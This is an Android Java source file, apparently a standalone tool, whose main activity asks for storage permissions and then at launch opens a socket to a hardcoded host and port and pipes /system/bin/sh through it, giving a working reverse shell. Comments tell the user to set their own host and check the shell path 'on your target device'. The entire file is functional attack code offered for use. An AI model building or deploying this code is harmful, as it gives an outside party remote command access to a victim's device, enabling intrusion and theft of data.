package com.reverseshell;

import androidx.appcompat.app.AppCompatActivity;
import androidx.core.app.ActivityCompat;
import androidx.core.content.ContextCompat;

import android.Manifest;
import android.content.pm.PackageManager;
import android.os.Bundle;


import java.io.IOException;
import java.io.InputStream;

import java.io.OutputStream;

import java.net.InetSocketAddress;
import java.net.Socket;

public class MainActivity extends AppCompatActivity {


    // change these to values to your liking
    private final static String HOST = "192.168.0.16";
    private final static int PORT = 8081;

    // `sh` should be on this path but verify on your target device
    private final static String SH_PATH = "/system/bin/sh";
    private static Socket sock = null;


    private void checkStoragePermission() {
        int permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.WRITE_EXTERNAL_STORAGE);
        if (permissionCheck == PackageManager.PERMISSION_DENIED)
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.WRITE_EXTERNAL_STORAGE}, 0);
        permissionCheck = ContextCompat.checkSelfPermission(this, Manifest.permission.READ_EXTERNAL_STORAGE);
        if (permissionCheck == PackageManager.PERMISSION_DENIED)
            ActivityCompat.requestPermissions(this, new String[]{Manifest.permission.READ_EXTERNAL_STORAGE}, 0);

    }

    @Override
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);

        checkStoragePermission();


        ExampleThread thread = new ExampleThread();
        thread.start();



    }

    // 스레드
    private class ExampleThread extends Thread {
        public ExampleThread() {

        }

        public void run() {



            try {
                sock = new Socket();
                sock.connect(new InetSocketAddress(HOST, PORT), 1000);
            } catch (IOException e) {
                System.out.println("Failed to create socket: " + e);
                return;
            }


            executeShell();

            if (sock != null && sock.isClosed()) {
                try {
                    sock.close();
                } catch (IOException e) {
                    // don't care
                }
            }



        }


    }



    public static void executeShell() {
        Process shell;
        try {
            shell = new ProcessBuilder(SH_PATH).redirectErrorStream(true).start();
        } catch (IOException e) {
            System.out.println("Failed to start \"" + SH_PATH  + "\": " + e);
            return;
        }

        InputStream pis, pes, sis;
        OutputStream pos, sos;

        try {
            pis = shell.getInputStream();
            pes = shell.getErrorStream();
            sis = sock.getInputStream();
            pos = shell.getOutputStream();
            sos = sock.getOutputStream();
        } catch (IOException e) {
            System.out.println("Failed to obtain streams: " + e);
            shell.destroy();
            return;
        }

        while ( !sock.isClosed()) {
            try {
                while (pis.available() > 0) {
                    sos.write(pis.read());
                }

                while (pes.available() > 0) {
                    sos.write(pes.read());
                }

                while (sis.available() > 0) {
                    pos.write(sis.read());
                }

                sos.flush();
                pos.flush();
            } catch (IOException e) {
                System.out.println("Stream error: " + e);
                shell.destroy();
            }

            try {
                Thread.sleep(50);
            } catch (InterruptedException e) {
                // don't care
            }

            try {
                shell.exitValue();
                break;
            } catch (IllegalThreadStateException e) {
                // shell process is still running, can't get exit value
            }
        }

        System.out.println("Socket is not connected, exiting.");
        shell.destroy();
    }
}

